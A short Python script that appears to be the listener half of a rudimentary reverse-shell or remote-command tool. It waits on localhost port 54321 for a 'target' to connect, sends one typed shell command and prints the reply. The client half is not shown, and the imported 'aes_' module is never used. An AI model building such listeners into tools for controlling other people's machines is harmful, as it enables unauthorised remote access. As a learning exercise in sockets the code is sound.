import socket
import aes_

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sc.bind(("127.0.0.1", 54321))
sc.listen(5)
print("Listening for Incoming connection")
target, ip = sc.accept()
print("Target connected", target)
message = input("* Shell~%s:" % str(ip))
bytes = bytes(message, 'utf-8')
target.send(bytes)
answer = target.recv(1024)
print(answer)
sc.close()
